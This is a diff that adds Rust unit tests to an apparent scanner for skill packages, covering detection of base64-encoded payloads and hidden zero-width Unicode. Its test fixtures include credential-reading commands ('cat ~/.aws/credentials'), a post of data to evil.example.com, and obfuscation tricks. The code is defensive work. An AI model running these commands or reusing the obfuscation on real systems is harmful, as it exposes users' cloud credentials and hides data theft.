@@ -469,3 +469,181 @@ pub(crate) fn check_base64_payloads(
 
     (secrets_failed, behavioral_failed)
 }
+
+#[cfg(test)]
+mod tests {
+    use std::collections::HashMap;
+
+    use base64::{engine::general_purpose, Engine as _};
+
+    use super::*;
+
+    fn files(pairs: &[(&str, &str)]) -> HashMap<String, String> {
+        pairs
+            .iter()
+            .map(|(k, v)| (k.to_string(), v.to_string()))
+            .collect()
+    }
+
+    fn b64(s: &str) -> String {
+        general_purpose::STANDARD.encode(s)
+    }
+
+    // --- check_base64_payloads ---
+
+    #[test]
+    fn base64_dangerous_pattern_fires_obfuscated_code() {
+        // Encode a string long enough to produce ≥32 non-padding base64 chars (required by
+        // the chunk regex). "cat ~/.aws/credentials" encodes to only 30 — use a longer path.
+        let encoded = b64("cat /home/user/.aws/credentials && echo done");
+        let tf = files(&[("scripts/x.sh", &encoded)]);
+        let mut findings = Vec::new();
+        check_base64_payloads(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_OBFUSCATED_DANGEROUS_CODE),
+            "VTD-0077 should fire when base64 decodes to a sensitive pattern"
+        );
+    }
+
+    #[test]
+    fn base64_network_sink_fires_obfuscated_network_call() {
+        // Encode a network sink with no sensitive pattern match.
+        let encoded = b64("requests.post('https://evil.example.com', data=x)");
+        let tf = files(&[("scripts/x.sh", &encoded)]);
+        let mut findings = Vec::new();
+        check_base64_payloads(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_OBFUSCATED_NETWORK_CALL),
+            "VTD-0078 should fire when base64 decodes to a network sink"
+        );
+    }
+
+    #[test]
+    fn base64_url_fires_obfuscated_external_url() {
+        let encoded = b64("https://evil.example.com/payload");
+        let tf = files(&[("scripts/x.sh", &encoded)]);
+        let mut findings = Vec::new();
+        check_base64_payloads(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_OBFUSCATED_EXTERNAL_URL),
+            "VTD-0079 should fire when base64 decodes to an external URL"
+        );
+    }
+
+    #[test]
+    fn base64_printable_in_md_fires_advisory() {
+        // Benign printable base64 in a markdown file → advisory VTD-0080.
+        let encoded = b64("This is some readable documentation text for the skill.");
+        let tf = files(&[("SKILL.md", &encoded)]);
+        let mut findings = Vec::new();
+        check_base64_payloads(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_BASE64_IN_MARKDOWN),
+            "VTD-0080 should fire for decodable printable base64 in .md"
+        );
+    }
+
+    #[test]
+    fn base64_in_evals_dir_skipped() {
+        let encoded = b64("cat ~/.aws/credentials");
+        let tf = files(&[("evals/test.json", &encoded)]);
+        let mut findings = Vec::new();
+        check_base64_payloads(&tf, &mut findings);
+        assert!(
+            findings.is_empty(),
+            "evals/ directory must be skipped by base64 scanner"
+        );
+    }
+
+    #[test]
+    fn base64_in_references_dir_skipped() {
+        let encoded = b64("cat ~/.aws/credentials");
+        let tf = files(&[("references/doc.md", &encoded)]);
+        let mut findings = Vec::new();
+        check_base64_payloads(&tf, &mut findings);
+        assert!(
+            findings.is_empty(),
+            "references/ directory must be skipped by base64 scanner"
+        );
+    }
+
+    #[test]
+    fn concatenated_base64_literals_detected() {
+        // Two adjacent string literals that together decode to a sensitive pattern.
+        let full = b64("cat ~/.aws/credentials and more padding text here extra");
+        let mid = full.len() / 2;
+        let part1 = &full[..mid];
+        let part2 = &full[mid..];
+        let content = format!(r#""{part1}" + "{part2}""#);
+        let tf = files(&[("scripts/x.sh", &content)]);
+        let mut findings = Vec::new();
+        check_base64_payloads(&tf, &mut findings);
+        // Should find either obfuscated code or at minimum a network/url finding on the combined decode.
+        assert!(
+            !findings.is_empty(),
+            "concatenated base64 literals should be detected"
+        );
+    }
+
+    #[test]
+    fn shell_var_assignment_base64_detected() {
+        let encoded = b64("cat ~/.aws/credentials padding padding padding padding");
+        let content = format!("PAYLOAD=\"{encoded}\"");
+        let tf = files(&[("scripts/x.sh", &content)]);
+        let mut findings = Vec::new();
+        check_base64_payloads(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_OBFUSCATED_DANGEROUS_CODE),
+            "shell var assignment base64 should fire VTD-0077"
+        );
+    }
+
+    // --- scan_hidden_unicode ---
+
+    #[test]
+    fn hidden_unicode_alone_fires_medium_finding() {
+        // Zero-width space with no dangerous content after stripping.
+        let content = "Hello\u{200B}world this is normal text";
+        let tf = files(&[("SKILL.md", content)]);
+        let mut findings = Vec::new();
+        scan_hidden_unicode(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_HIDDEN_UNICODE_CHARACTER),
+            "VTD-0081 should fire for hidden unicode with no dangerous payload"
+        );
+        assert!(
+            findings
+                .iter()
+                .all(|f| f.rule_id != RULE_OBFUSCATED_DANGEROUS_CODE),
+            "VTD-0077 must not fire when hidden unicode conceals nothing dangerous"
+        );
+    }
+
+    #[test]
+    fn hidden_unicode_concealing_sensitive_pattern_escalates() {
+        // Build a line that has a zero-width space inserted into a credential path.
+        // After stripping invisible chars the line should match VTD-0005.
+        let content = "cat ~/.aws\u{200B}/credentials";
+        let tf = files(&[("scripts/x.sh", content)]);
+        let mut findings = Vec::new();
+        scan_hidden_unicode(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_OBFUSCATED_DANGEROUS_CODE),
+            "VTD-0077 should fire when hidden unicode conceals a sensitive pattern"
+        );
+    }
+}
